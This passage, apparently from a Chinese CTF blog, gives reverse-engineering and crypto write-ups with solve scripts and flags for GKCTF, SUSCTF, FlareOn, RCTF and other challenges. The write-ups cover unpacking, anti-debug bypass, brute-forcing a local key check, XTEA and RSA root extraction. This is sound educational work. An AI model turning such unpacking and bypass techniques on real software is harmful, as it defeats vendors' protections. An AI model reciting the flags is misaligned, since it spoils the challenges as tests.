LABEL_11; } v7 = v4;LABEL_11: if ( v7 == 14 ) success(); fail();} 最终脚本： 12345678910111213a=[0x2f,0x2e,0x2e,0x76,0x34,0x70,0x24,0x24,0x21,0x3e,0x59,0x35,0x39,0x2d]b=[0x29,0x28,0x2a,0x26,0x5e,0x25,0x34,0x38,0x39,0x24,0x21,0x30,0x35,0x37,0x40,0x23,0x3e,0x3c,0x3a,0x32,0x31,0x36,0x33,0x71,0x77,0x65]c=[]d=0print(len(b))for i in range(len(a)): a[i]=a[i]^7 c.append(b.index(a[i]))print(c)for i in range(len(c)): d*=26 d+=c[i]print(d) powerPackedpowerPC架构的，里面的指令根本读不懂，解题倒是很简单 加了个upx的壳，脱掉后就是很简单的对比： 123456789101112131415161718192021int __cdecl main(int argc, const char **argv, const char **envp){ int i; // [sp+8h] [-58h] _BYTE v5[32]; // [sp+10h] [-50h] BYREF char v6[24]; // [sp+30h] [-30h] BYREF int v7; // [sp+48h] [-18h] const char **v8; // [sp+4Ch] [-14h] v7 = argc; v8 = argv; strcpy(v6, &quot;EHK}kanqxgarqygtre&quot;); printf(&quot;Insert password : &quot;, argv, envp); _isoc99_scanf(&quot;%31s&quot;, v5); for ( i = 0; i &lt; 21; ++i ) v6[i] -= 2; if ( strcmp(v5, v6) ) puts(&quot;Wrong password.&quot;); else puts(&quot;Password is correct. Submit this as the flag.&quot;); return 0;} 逐位减2后就得到了flag:CFI{i_love_powerpc} [FlareOn4]greek_to_me使用c实现的网络通信 相关函数：1int socket(int domain, int type, int protocol); type：指定socket类型。常用的socket类型有，SOCK_STREAM、SOCK_DGRAM、SOCK_RAW、SOCK_PACKET、SOCK_SEQPACKET等等（socket的类型有哪些？）。 domain：即协议域，又称为协议族（family）。常用的协议族有，AF_INET、AF_INET6、AF_LOCAL（或称AF_UNIX，Unix域socket）、AF_ROUTE等等。协议族决定了socket的地址类型，在通信中必须采用对应的地址，如AF_INET决定了要用ipv4地址（32位的）与端口号（16位的）的组合、AF_UNIX决定了要用一个绝对路径名作为地址。 protocol：故名思意，就是指定协议。常用的协议有，IPPROTO_TCP、IPPTOTO_UDP、IPPROTO_SCTP、IPPROTO_TIPC等，它们分别对应TCP传输协议、UDP传输协议、STCP传输协议、TIPC传输协议 1int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen); sockfd：即socket描述字，它是通过socket()函数创建了，唯一标识一个socket。bind()函数就是将给这个描述字绑定一个名字 addr：一个const struct sockaddr *指针，指向要绑定给sockfd的协议地址。这个地址结构根据地址创建socket时的地址协议族的不同而不同，如ipv4对应的是： 12345678910struct sockaddr_in { sa_family_t sin_family; in_port_t sin_port; struct in_addr sin_addr; };struct in_addr { uint32_t s_addr; }; 开始解题拖进IDA，发现与是用C实现的一段网络通信 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657int __usercall sub_401008@&lt;eax&gt;(int _EDI@&lt;edi&gt;, _DWORD *a2@&lt;esi&gt;){ _BYTE *v2; // eax char v3; // dl bool v5; // cf unsigned int v6; // ett int v7; // edx int v9; // [esp-4h] [ebp-1Ch] char buf[4]; // [esp+10h] [ebp-8h] BYREF SOCKET s; // [esp+14h] [ebp-4h] int savedregs; // [esp+18h] [ebp+0h] BYREF s = sub_401121(buf); // 创建进程，并接收4字节的消息，消息写入buf中 if ( !s ) return 0; v2 = &amp;loc_40107C; v3 = buf[0]; do { *v2 = (v3 ^ *v2) + 34; // SMC ++v2; } while ( (int)v2 &lt; (int)&amp;loc_40107C + 121 ); if ( (unsigned __int16)sub_4011E6(&amp;loc_40107C, 121) == 64350 )// SMC解密是否正确 { _EBX = *(_DWORD *)(v9 + 377554449); __asm { lock xor bl, [edi+61791C4h] } v5 = __CFADD__(*(_DWORD *)(8 * (_DWORD)a2 + 0xFB5E), -250248954); *(_DWORD *)(8 * (_DWORD)a2 + 0xFB5E) -= 250248954; if ( v9 == 1 ) { v6 = v5 + 427886322; v5 = MEMORY[0xFB5E] &lt; v6; MEMORY[0xFB5E] -= v6; } __asm { icebp } *a2 -= v5 + 530171120; v7 = *(_DWORD *)(v9 - 1 + 494994972); __outbyte(6u, 0x5Eu); *(_DWORD *)(v7 - 17) &amp;= 0xF2638106; MEMORY[0xFB41] &amp;= 0x66199C4u; *(a2 - 17) &amp;= 0xE6678106; *(_DWORD *)(8 * (_DWORD)&amp;savedregs + 64350 + 6) &amp;= 0x69D6581u; *(_DWORD *)(v7 - 14) -= 107715012; MEMORY[0xFB07] += 278298362; *(_DWORD *)((char *)a2 - 18) += 1368424186; *(_DWORD *)(_EBX + 6) -= 116354433; *(_DWORD *)(v7 - 23) ^= 0x7C738106u; send(s, &quot;Congratulations! But wait, where's my flag?&quot;, 43, 0); } else { send(s, &quot;Nope, that's not it.&quot;, 20, 0); } closesocket(s); return WSACleanup();} 中间有一段验证函数，但是这段函数不好逆，而总情况也只有256种，不如进行一个暴力破解 12345678910111213141516171819import sysimport osimport socketfrom pwn import *ip = '127.0.0.1'port = 2222for i in range(256): os.startfile(&quot;greek_to_me.exe&quot;) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((ip, port)) s.send(p32(i)) #注意大小端，否则跑不出来 data = s.recv(1024) s.close() print(data) if b'Congratulations' in data: print(&quot;that's it!&quot;) break print(i)print('end') 跑出来i=162，进行动调 12345678910import sysimport osimport socketfrom pwn import *ip = '127.0.0.1'port = 2222i=162s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((ip, port))s.send(p32(i)) 按c转为代码，flag就出来了 [GKCTF 2021]Crashgo逆向，换了IDA7.7来做，感觉真不错 主要的判断函数为main_check 第一段是一段3DES+base64，key和iv在off_61e540中，解出来为87f645e9-b628-412f-9d7a- 第二段是Sha256碰撞 到第三段的时候就会发现问题：这段函数返回值为0，而事实上返回值必然不能为0；并且第三段哈希值并未给出，说明这段函数的反编译出了问题 进到汇编函数中，把对应的retn相关代码nop掉，这时候可以看到剩余的碰撞部分 整个脚本来跑碰撞： 1234567891011121314151617181920212223import hashlibimport stringh1='6e2b55c78937d63490b4b26ab3ac3cb54df4c5ca7d60012c13d2d1234a732b74' #sha256h2='6500fe72abcab63d87f213d2218b0ee086a1828188439ca485a1a40968fd272865d5ca4d5ef5a651270a52ff952d955c9b757caae1ecce804582ae78f87fa3c9' #sha512h3='ff6e2fd78aca4736037258f0ede4ecf0' #md5s=''ans1=''ans2=''ans3=''table='0123456789abcdef-'# print(table)for i1 in table: for i2 in table: for i3 in table: for i4 in table: s=i1+i2+i3+i4 if hashlib.sha256(s.encode()).hexdigest()==h1: ans1=s if hashlib.sha512(s.encode()).hexdigest()==h2: ans2=s if hashlib.md5(s.encode()).hexdigest()==h3: ans3=sprint(ans1+ans2+ans3) 拼起来即可得到flag","link":"/2022/04/22/Reverse-6/"},{"title":"Reverse 7","text":"[TOC] [GKCTF 2021]SoMuchCode动调是个好东西 动调定位到输入和输出函数，然后在1209行找到关键的encrypt函数 点进行，按x查看引用，能大概看出是个XTEA算法 循环12轮 12345678*input += ((key[(v75 &gt;&gt; 2) &amp; 3] ^ input[7]) + (input[1] ^ v75)) ^ (((16 * input[7]) ^ (input[1] &gt;&gt; 3)) + ((input[7] &gt;&gt; 5) ^ (4 * input[1])));input[1] += (((key[v120] ^ input[0]) + (input[2] ^ v75)) ^ (((16 * input[0]) ^ (input[2] &gt;&gt; 3))+ ((input[0] &gt;&gt; 5) ^ (4 * input[2]))));input[2] += + ((((16 * input[1]) ^ (input[3] &gt;&gt; 3)) + ((input[1] &gt;&gt; 5) ^ (4 * input[3]))) ^ ((input[3] ^ v75) + (key[v123] ^ input[1])));input[3] += + ((((16 * input[2]) ^ (input[4] &gt;&gt; 3)) + ((input[2] &gt;&gt; 5) ^ (4 * input[4]))) ^ ((input[4] ^ v75) + (key[v115 ^ 3] ^ input[2])));input[4]=input[4] + ((((16 * input[3]) ^ (input[5] &gt;&gt; 3)) + ((input[3] &gt;&gt; 5) ^ (4 * input[5]))) ^ ((input[5] ^ v75) + (key[v99] ^ input[3])));input[5]=(((key[v120] ^ input[4]) + (input[6] ^ v75)) ^ (((16 * input[4]) ^ (input[6] &gt;&gt; 3))+ ((input[4] &gt;&gt; 5) ^ (4 * input[6]))))+ v127input[6]+= ((((16 * input[5]) ^ (input[7] &gt;&gt; 3)) + ((input[5] &gt;&gt; 5) ^ (4 * input[7]))) ^ ((key[v123] ^ input[5])+ (input[7] ^ v75)));input[7] += ((input[6]&gt;&gt;5)+(input[0]*4) + ((input[0] &gt;&gt; 3) ^ (16 * input[6]))) ^ ((input[0] ^ v75) + (key[v210] ^ input[6])); 每轮加密过程如以下形式，v75可以推测是sum值，动调出来发现每轮自增0x33445566 1input[x] += + ((((16 * input[x-1]) ^ (input[x+1] &gt;&gt; 3)) + ((input[x-1] &gt;&gt; 5) ^ (4 * input[x+1]))) ^ ((input[x+1] ^ v75) + (key[?] ^ input[1]))); 动调找到key 动调找到要对比的数据 123456789101112131415161718192021222324252627282930313233343536.data:00007FF6C82CA6D0 byte_7FF6C82CA6D0 db 5Ch ; DATA XREF: main+F69↑w.data:00007FF6C82CA6D0 ; main:loc_7FF6C82C3945↑w ....data:00007FF6C82CA6D1 byte_7FF6C82CA6D1 db 0ABh ; DATA XREF: main+1119↑w.data:00007FF6C82CA6D1 ; main:loc_7FF6C82C3AF5↑w.data:00007FF6C82CA6D2 byte_7FF6C82CA6D2 db 3Ch ; DATA XREF: main+12C9↑w.data:00007FF6C82CA6D2 ; main:loc_7FF6C82C3CA5↑w.data:00007FF6C82CA6D3 byte_7FF6C82CA6D3 db 99h ; DATA XREF: main+147A↑w.data:00007FF6C82CA6D3 ; main:loc_7FF6C82C3E56↑w.data:00007FF6C82CA6D4 byte_7FF6C82CA6D4 db 29h ; DATA XREF: main:loc_7FF6C82C3F1F↑w.data:00007FF6C82CA6D5 byte_7FF6C82CA6D5 db 0E1h ; DATA XREF: main:loc_7FF6C82C3FEF↑w.data:00007FF6C82CA6D6 byte_7FF6C82CA6D6 db 40h ; DATA XREF: main:loc_7FF6C82C40BF↑w.data:00007FF6C82CA6D7 byte_7FF6C82CA6D7 db 3Fh ; DATA XREF: main:loc_7FF6C82C418F↑w.data:00007FF6C82CA6D8 byte_7FF6C82CA6D8 db 0DEh ; DATA XREF: main:loc_7FF6C82C425F↑w.data:00007FF6C82CA6D9 byte_7FF6C82CA6D9 db 91h ; DATA XREF: main:loc_7FF6C82C432F↑w.data:00007FF6C82CA6DA byte_7FF6C82CA6DA db 77h ; DATA XREF: main:loc_7FF6C82C43FF↑w.data:00007FF6C82CA6DB byte_7FF6C82CA6DB db 77h ; DATA XREF: main:loc_7FF6C82C44CF↑w.data:00007FF6C82CA6DC byte_7FF6C82CA6DC db 0A6h ; DATA XREF: main:loc_7FF6C82C459F↑w.data:00007FF6C82CA6DD byte_7FF6C82CA6DD db 0FEh ; DATA XREF: main:loc_7FF6C82C466F↑w.data:00007FF6C82CA6DE byte_7FF6C82CA6DE db 7Dh ; DATA XREF: main:loc_7FF6C82C473F↑w.data:00007FF6C82CA6DF byte_7FF6C82CA6DF db 73h ; DATA XREF: main:loc_7FF6C82C480F↑w.data:00007FF6C82CA6E0 byte_7FF6C82CA6E0 db 0E6h ; DATA XREF: main:loc_7FF6C82C48DF↑w.data:00007FF6C82CA6E1 byte_7FF6C82CA6E1 db 59h ; DATA XREF: main:loc_7FF6C82C49AF↑w.data:00007FF6C82CA6E2 byte_7FF6C82CA6E2 db 0CFh ; DATA XREF: main:loc_7FF6C82C4A7F↑w.data:00007FF6C82CA6E3 byte_7FF6C82CA6E3 db 0ECh ; DATA XREF: main:loc_7FF6C82C4B4F↑w.data:00007FF6C82CA6E4 byte_7FF6C82CA6E4 db 0E3h ; DATA XREF: main:loc_7FF6C82C4C1F↑w.data:00007FF6C82CA6E5 byte_7FF6C82CA6E5 db 4Ch ; DATA XREF: main:loc_7FF6C82C4CEF↑w.data:00007FF6C82CA6E6 byte_7FF6C82CA6E6 db 60h ; DATA XREF: main:loc_7FF6C82C4DBF↑w.data:00007FF6C82CA6E7 byte_7FF6C82CA6E7 db 0C9h ; DATA XREF: main:loc_7FF6C82C4E8F↑w.data:00007FF6C82CA6E8 byte_7FF6C82CA6E8 db 0A5h ; DATA XREF: main:loc_7FF6C82C4F5F↑w.data:00007FF6C82CA6E9 byte_7FF6C82CA6E9 db 0C0h ; DATA XREF: main:loc_7FF6C82C502F↑w.data:00007FF6C82CA6EA byte_7FF6C82CA6EA db 82h ; DATA XREF: main:loc_7FF6C82C50FF↑w.data:00007FF6C82CA6EB byte_7FF6C82CA6EB db 96h ; DATA XREF: main:loc_7FF6C82C526C↑w.data:00007FF6C82CA6EC byte_7FF6C82CA6EC db 1Eh ; DATA XREF: main:loc_7FF6C82C53D9↑w.data:00007FF6C82CA6ED byte_7FF6C82CA6ED db 2Ah ; DATA XREF: main:loc_7FF6C82C5546↑w.data:00007FF6C82CA6EE byte_7FF6C82CA6EE db 6Fh ; DATA XREF: main:loc_7FF6C82C56B3↑w.data:00007FF6C82CA6EF byte_7FF6C82CA6EF db 55h ; DATA XREF: main:loc_7FF6C82C5820↑w 写出解题脚本： 123456789101112131415161718192021222324252627282930#include&lt;stdio.h&gt;void decipher(unsigned int num_rounds, unsigned int input[8], unsigned int key[4]) { unsigned int i; unsigned int delta=0x33445566, sum=delta*num_rounds; for (i=0; i &lt; num_rounds; i++) { input[7]-= ((((16 * input[6]) ^ (input[0] &gt;&gt; 3)) + ((input[6] &gt;&gt; 5) ^ (4 * input[0]))) ^ ((input[0] ^ sum) + (key[((sum &gt;&gt; 2) &amp; 3)^3] ^ input[6]))); input[6]-= ((((16 * input[5]) ^ (input[7] &gt;&gt; 3)) + ((input[5] &gt;&gt; 5) ^ (4 * input[7]))) ^ ((key[((sum &gt;&gt; 2) &amp; 3)^2] ^ input[5])+ (input[7] ^ sum))); input[5]-= ((((16 * input[4]) ^ (input[6] &gt;&gt; 3)) + ((input[4] &gt;&gt; 5) ^ (4 * input[6]))) ^ ((key[((sum &gt;&gt; 2) &amp; 3)^1] ^ input[4]) + (input[6] ^ sum)) ); input[4]-= ((((16 * input[3]) ^ (input[5] &gt;&gt; 3)) + ((input[3] &gt;&gt; 5) ^ (4 * input[5]))) ^ ((input[5] ^ sum) + (key[(sum &gt;&gt; 2) &amp; 3] ^ input[3]))); input[3]-= ((((16 * input[2]) ^ (input[4] &gt;&gt; 3)) + ((input[2] &gt;&gt; 5) ^ (4 * input[4]))) ^ ((input[4] ^ sum) + (key[((sum &gt;&gt; 2) &amp; 3) ^ 3] ^ input[2]))); input[2]-= ((((16 * input[1]) ^ (input[3] &gt;&gt; 3)) + ((input[1] &gt;&gt; 5) ^ (4 * input[3]))) ^ ((input[3] ^ sum) + (key[((sum &gt;&gt; 2) &amp; 3)^2] ^ input[1]))); input[1]-= ((((16 * input[0]) ^ (input[2] &gt;&gt; 3)) + ((input[0] &gt;&gt; 5) ^ (4 * input[2]))) ^ ((key[((sum &gt;&gt; 2) &amp; 3)^1] ^ input[0]) + (input[2] ^ sum))); input[0]-= ((((16 * input[7]) ^ (input[1] &gt;&gt; 3)) + ((input[7] &gt;&gt; 5) ^ (4 * input[1]))) ^ ((key[(sum &gt;&gt; 2) &amp; 3] ^ input[7]) + (input[1] ^ sum))) ; sum -= delta; }}int main(){ unsigned int v[8]={0x993cab5c,0x3f40e129,0x777791de,0x737dfea6,0xeccf59e6,0xc9604ce3,0x9682c0a5,0x556f2a1e}; //unsigned int v[8]={0x5cab3c99,0x29e1403f,0xde917777,0xa6fe7d73,0xe659cfec,0xe34c60c9,0xa5c08296,0x1e2a6f55}; unsigned int k[4]={0x36b0,0x13816,0x10,0x1e0f3}; unsigned int r=12;//num_rounds建议取值为32 // v为要加密的数据是两个32位无符号整数 // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位 printf(&quot;加密前原始数据：%x %x\\n&quot;,v[0],v[1]); decipher(r, v, k); printf(&quot;解密后的数据：%s\\n&quot;,v); return 0;} GKCTF{9b34a61df773acf0e4dec25ea5fb0e29} [GKCTF 2021]app-debug一开始用jadx打开，进到mainActivity，有个关键的check函数没有出来，看了网上的wp才知道引用了外部库 IDA打开，发现有.so文件 进去后搜索main，进到关键函数 需要安装相关环境，待续…. [RCTF2019]DontEatMe发现存在反调试，把17改为16绕过 测试输入：0123456798abcdef0123456798abcdef 分析一下程序的流程，大致是获取十六进制输入，对输入做加密，然后生成迷宫，走迷宫 从迷宫开始分析，大致就是先给某个数据段附了值，然后将该数据段与某一串数据进行异或，异或后的值转为二进制来生成迷宫 将生成后的迷宫放出来：(s为起点，e为终点) 123456789101112131415161 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 0 0 0 0 0 0 0 0 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 0 1 1 1 1 1 11 0 1 1 1 1 1 1 1 0 1 1 1 1 1 11 0 1 1 1 1 0 0 0 e 0 0 0 1 1 11 0 1 1 1 1 0 1 1 1 1 1 0 1 1 11 0 1 1 1 1 0 1 1 1 1 1 0 1 1 11 0 1 1 1 1 0 0 0 0 1 1 0 1 1 11 0 1 1 1 1 1 1 1 0 1 1 0 1 1 11 0 1 1 1 1 1 1 1 0 1 1 0 1 1 11 0 0 0 0 s 0 0 0 0 1 1 0 1 1 11 1 1 1 1 0 1 1 1 1 1 1 0 1 1 11 1 1 1 1 0 0 0 0 0 0 0 0 1 1 11 1 1 1 1 1 1 1 1 1 1 1 1 1 1 11 1 1 1 1 1 1 1 1 1 1 1 1 1 1 11 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 迷宫路径：ddddwwwaaawwwddd 然后要做的就是解密了 中间的解密算法了解了一下才知道是BLOWFISH加密算法 flag{db824ef8605c5235b4bbacfa2ff8e087} [SUSCTF 2022]hell_world参考【SUSCTF2022】DigitalCircuits &amp; hell_world &amp; tttree去花_哔哩哔哩_bilibili IDA64打开，可以发现有很多函数，其中有大量代码，难以入手 shift+f12搜索字符串，查找flag，交叉引用进到相关函数中，可以发现一个类似虚拟机的东西 动调，case0执行完并没有输出其中的字符串”Input Flag:”，猜测只是将字符串加载到缓冲区中 case1执行完后，”Input Flag”被输出，猜测该部分作用为输出缓冲区内容 在case2中单步调试时停止不动，开始输入，可知该部分作用为获得输入 而case2运行完后接着运行case3，其中v2=5时进入case 5，case 5中”Wrong”提示不能进入该部分，同时猜测该case3作用为判断输入长度 接下来的流程为case9 -&gt; case10 -&gt; case11-&gt;case10-&gt;case11-&gt;case10… 而case10为加密块，case11为验证块，提取出其中的数组，做异或即可得到flag 12345678910111213a=[0x56,0x0DA,0x0CD,0x3A,0x7E,0x86,0x13,0x0B5,0x1D,0x9D,0x0FC,0x97,0x8C,0x31,0x6B,0x0C9,0x0FB,0x1A,0x0E2,0x2D,0x0DC,0x0D3,0x0F1,0x0F4,0x36,0x9,0x20,0x42,0x4,0x6A,0x71,0x53,0x78,0x0A4,0x97,0x8F,0x7A,0x72,0x39,0x0E8,0x3D,0x0FA,0x40,0x3D]b=[0x5,0x8F,0x9E,0x79,0x2A,0x0C0,0x68,0x81,0x2D,0x0FC,0x0CF,0x0A4,0x0B5,0x55,0x5F,0x0E4,0x9D,0x23,0x0D6,0x1D,0x0F1,0x0E7,0x97,0x91,0x6,0x24,0x42,0x71,0x3C,0x58,0x5C,0x30,0x19,0x0C6,0x0F5,0x0BC,0x4B,0x42,0x5D,0x0DA,0x58,0x9B,0x24,0x40]s=''for i in range(len(a)): s+=chr(a[i]^b[i])print(s)# SUSCTF{40a339d4-f940-4fe0-b382-cabb310d2ead} [CFI-CTF 2018]Automated Reversing下载附件，得到一堆elf文件 拖进IDA里，只有汇编代码，不过逻辑还是挺简单的，只是做了加减、异或的操作，然后与一个数比较 那么我们可以做逆操作，利用固定偏移量依次提取出操作符、操作值和比较值，进行逆计算获取这些预期字符，看看它们是什么，然后就出flag了 下载的附件中含有生成代码和解题代码，这里附上 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051# generator.py#!/usr/bin/env pythonfrom pwn import *from random import *text = &quot;&quot;&quot;Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aenean commodo ligula dolor. Aenean massa. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Donec quam felis, ultricies nec, pellentesque eu, pretium quis, sem. Nulla consequat massa quis enim. Donec pede justo, fringilla vel, aliquet nec, vulputate eget, arcu. In enim justo, rhoncus ut, imperdiet a, venenatis vitae, justo. Nullam dictum felis eu pede mollis pretium. Integer tincidunt. Cras dapibus. The flag is CFI{1s_th1s_4_pr0g_ch4ll_0r_4_r3ve3se_ch4ll?}. Aenean vulputate eleifend tellus. Aenean leo ligula, porttitor eu, consequat vitae, eleifend ac, enim. I stole this idea directly from Defcon Quals 2016. Phasellus viverra nulla ut metus varius laoreet. Quisque rutrum. Aenean imperdiet. Etiam ultricies nisi vel augue. Curabitur ullamcorper ultricies nisi. Nam eget dui. Etiam rhoncus. Maecenas tempus, tellus eget condimentum rhoncus, sem quam semper libero, sit amet adipiscing sem neque sed ipsum.&quot;&quot;&quot;context(arch='amd64')for i, c in enumerate(text): operator = [&quot;xor&quot;, &quot;sub&quot;, &quot;add&quot;][randint(0, 2)] key = randint(1, 100) if operator == &quot;xor&quot;: check = (ord(c) ^ key) &amp; 0xff if operator == &quot;sub&quot;: check = (ord(c) - key) &amp; 0xff if operator == &quot;add&quot;: check = (ord(c) + key) &amp; 0xff code = &quot;&quot;&quot; push 0 push 5 mov rdi, rsp mov rax, 0x23 syscall pop rax pop rax mov rax, [rsp + 0x10] mov dl, byte ptr [rax] {} dl, {} cmp dl, {} jne error mov rdi, 0 mov rax, 0x3c syscall error: mov rdi, 1 mov rax, 0x3c syscall &quot;&quot;&quot;.format(operator, key, check) with open(&quot;binaries/binary{}&quot;.format(i), &quot;w&quot;) as f: elf = make_elf(asm(code)) f.write(elf) 12345678910111213141516171819202122#solution.py#!/usr/bin/env pythonflag = &quot;&quot;for i in range(1007): path = &quot;binaries/binaries/binary{}&quot;.format(i) with open(path, &quot;rb&quot;) as f: binary = f.read() operator = binary[0xca] key = binary[0xcb] check = binary[0xce] if operator == 0xc2: # add flag += chr((check - key) &amp; 0xff) elif operator == 0xea: # sub flag += chr((check + key) &amp; 0xff) else: flag += chr(check ^ key)print(flag) [MRCTF2020 Virtual_tree]ida32打开，流程还是挺明白的 中间存在花指令，修复掉 进到sub_401680中，类似一颗树的前序遍历，取其中的对输入字符串做异或加密 动调提取出a1的数据： 1MLGPOKFCJENIHDBA 然后到sub_5F16F0，一开始以为一直调用的是sub_5f1510这个函数，只不过传入的参数每次都不一样 但实际上动调的时候我们可以发现，实际的函数是这样的…里面调用的函数被替换掉了 实际上分别是一些加减、异或的操作 接着逆即可,减法的时候需要注意绝对值的问题： 1234567891011121314151617181920212223a =[ 0x17, 0x63, 0x77, 0x03, 0x52, 0x2E, 0x4A, 0x28, 0x52, 0x1B, 0x17, 0x12, 0x3A, 0x0A, 0x6C, 0x62]a[15]=(a[15]-2)%256a[14]^=a[15]a[12]=(a[2]-a[12])%256a[11]^=a[12]a[10]=(a[7]-a[10])%256a[9]=(a[8]-a[9])%256a[8]^=a[7]a[7]=(a[7]-3)%256a[6]=a[1]-a[6]a[4]^=a[5]a[3]=(a[7]-a[3]%256)a[2]=(a[2]-7)%256a[1]^=a[2]a[0]=(a[0]-10)%256s='MLGPOKFCJENIHDBA'f=''for i in range(16): f+=chr(ord(s[i])^a[i])print(f) 一些去花小感想这题去花指令的过程挺曲折的 像这样的花指令，以往都是两条指令都nop掉，但实际上这样子操作是错误的，因为jump的时候跳到的还是下面的那条指令，只不过由于加了偏移量的关系，实际上执行的不是call xxxx这条指令，而是另一条指令，实际操作只需要将下面的指令nop一次，将余下的字节在重新整理为代码即可。","link":"/2022/05/27/Reverse-7/"},{"title":"SUSCTF2022 large case","text":"[SUSCTF 2022 Crypto]large case记录一道因为忽视填充长度而无法做出的题目（real problem:菜） 题目： 123456789101112131415161718192021222324from Crypto.Util.number import *from secret import e,messagedef pad(s): if len(s)&lt;3*L: s+=bytes(3*L-len(s)) return sL=128p=127846753573603084140032502367311687577517286192893830888210505400863747960458410091624928485398237221748639465569360357083610343901195273740653100259873512668015324620239720302434418836556626441491996755736644886234427063508445212117628827393696641594389475794455769831224080974098671804484986257952189021223q=145855456487495382044171198958191111759614682359121667762539436558951453420409098978730659224765186993202647878416602503196995715156477020462357271957894750950465766809623184979464111968346235929375202282811814079958258215558862385475337911665725569669510022344713444067774094112542265293776098223712339100693r=165967627827619421909025667485886197280531070386062799707570138462960892786375448755168117226002965841166040777799690060003514218907279202146293715568618421507166624010447447835500614000601643150187327886055136468260391127675012777934049855029499330117864969171026445847229725440665179150874362143944727374907n=p*q*rassert isPrime(GCD(e,p-1)) and isPrime(GCD(e,q-1)) and isPrime(GCD(e,r-1)) and e==GCD(e,p-1)*GCD(e,q-1)*GCD(e,r-1)assert len(message)&gt;L and len(message)&lt;2*Lassert b'SUSCTF' in messagem=bytes_to_long(pad(message))c=pow(m,e,n)print(c)'''2832775557487418816663494645849097066925967799754895979829784499040437385450603537732862576495758207240632734290947928291961063611897822688909447511260639429367768479378599532712621774918733304857247099714044615691877995534173849302353620399896455615474093581673774297730056975663792651743809514320379189748228186812362112753688073161375690508818356712739795492736743994105438575736577194329751372142329306630950863097761601196849158280502041616545429586870751042908365507050717385205371671658706357669408813112610215766159761927196639404951251535622349916877296956767883165696947955379829079278948514755758174884809479690995427980775293393456403529481055942899970158049070109142310832516606657100119207595631431023336544432679282722485978175459551109374822024850128128796213791820270973849303929674648894135672365776376696816104314090776423931007123128977218361110636927878232444348690591774581974226318856099862175526133892''' 在factordb.com上分解p-1、q-1、r-1，猜测e_p=757,e_q=66553,e_r=5156273（别问我为啥这样猜，因为玄学） 或者参考dl的得法： 1234567891011121314for i in primefac(int(p-1)): if pow(c,(p-1)//i,p)==1: ep=i breakfor i in primefac(int(q-1)): if pow(c,(q-1)//i,q)==1: eq=i breakfor i in primefac(int(r-1)): if pow(c,(r-1)//i,r)==1: er=i breakep,eq,er=757,66553,5156273e=ep*eq*er 既然指明了 $GCD(e,\\phi(n))\\neq 1$ ，那么就大概可以推测出使用AMM算法了 然而问题是 $e_r$ 过大，算不了。那么如何绕过它呢？ 答案是利用题目中message填充长度过大： 令M为原消息，m为填充后消息： c=m^e\\ mod\\ n\\\\ c'=M^e\\ mod\\ n\\\\ M=m>>1024则 c'=M^e=(m>>1024)^e=\\frac{m^e}{ {2^{1024} }^e}=\\frac{c}{ {2^{1024} }^e}\\ mod\\ n原来所求问题： m^e=c+k_1pqr转化为： M^e=c'+k_2pqr=c'+k_3pq此后则可以利用AMM算法和中国剩余定理得到flag了： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677from Crypto.Util.number import *import gmpy2import randomfrom Algorithm import crtimport sympydef rth_root(cip,r,q): &quot;&quot;&quot; cip^r==q &amp;&amp; r|q-1 &quot;&quot;&quot; rnum=random.randint(1,q) while (pow(rnum,(q-1)//r,q)==1): rnum=random.randint(1,q) t=1 while((q-1)%pow(r,t)==0): t+=1 t-=1 s=(q-1)//pow(r,t) k = 1 while (k * s + 1) % r != 0: k += 1 alpha = (k * s + 1) // r a=pow(rnum,pow(r,t-1)*s,q) b=pow(cip,r*alpha-1,q) c=pow(rnum,s,q) h=1 print('t='+str(t)) for i in range(1,t): # print('1213') d=pow(b,pow(r,t-1-i),q) if d==1: j=0 else: j=(-sympy.discrete_log(q,d,a))%q b=b*(pow(pow(c,r,q),j,q))%q h=h*pow(c,j,q)%q c=pow(c,r,q)%q return pow(cip,alpha,q)*h%qdef findAllPRoot(root,p,e): maySolve=[root] while(len(maySolve)&lt;e): maySolve.append(root*pow(random.randint(2,p-1),(p-1)//e,p)%p) print('finish') return maySolvep=127846753573603084140032502367311687577517286192893830888210505400863747960458410091624928485398237221748639465569360357083610343901195273740653100259873512668015324620239720302434418836556626441491996755736644886234427063508445212117628827393696641594389475794455769831224080974098671804484986257952189021223q=145855456487495382044171198958191111759614682359121667762539436558951453420409098978730659224765186993202647878416602503196995715156477020462357271957894750950465766809623184979464111968346235929375202282811814079958258215558862385475337911665725569669510022344713444067774094112542265293776098223712339100693r=165967627827619421909025667485886197280531070386062799707570138462960892786375448755168117226002965841166040777799690060003514218907279202146293715568618421507166624010447447835500614000601643150187327886055136468260391127675012777934049855029499330117864969171026445847229725440665179150874362143944727374907p_e=757q_e=66553r_e=5156273n=p*q*re=p_e*q_e*r_eassert isPrime(GCD(e,p-1)) and isPrime(GCD(e,q-1)) and isPrime(GCD(e,r-1)) and e==GCD(e,p-1)*GCD(e,q-1)*GCD(e,r-1)print(e)c=2832775557487418816663494645849097066925967799754895979829784499040437385450603537732862576495758207240632734290947928291961063611897822688909447511260639429367768479378599532712621774918733304857247099714044615691877995534173849302353620399896455615474093581673774297730056975663792651743809514320379189748228186812362112753688073161375690508818356712739795492736743994105438575736577194329751372142329306630950863097761601196849158280502041616545429586870751042908365507050717385205371671658706357669408813112610215766159761927196639404951251535622349916877296956767883165696947955379829079278948514755758174884809479690995427980775293393456403529481055942899970158049070109142310832516606657100119207595631431023336544432679282722485978175459551109374822024850128128796213791820270973849303929674648894135672365776376696816104314090776423931007123128977218361110636927878232444348690591774581974226318856099862175526133892i=pow(2,1024,n)i=pow(i,e,n)i=gmpy2.invert(i,n)c_=c*i%nc_=c_%(p*q)d1=gmpy2.invert(p_e*r_e,q-1)d2=gmpy2.invert(q_e*r_e,p-1)c_1=pow(c_,d2,p)c_2=pow(c_,d1,q)r1=rth_root(c_1,p_e,p)r2=rth_root(c_2,q_e,q)print(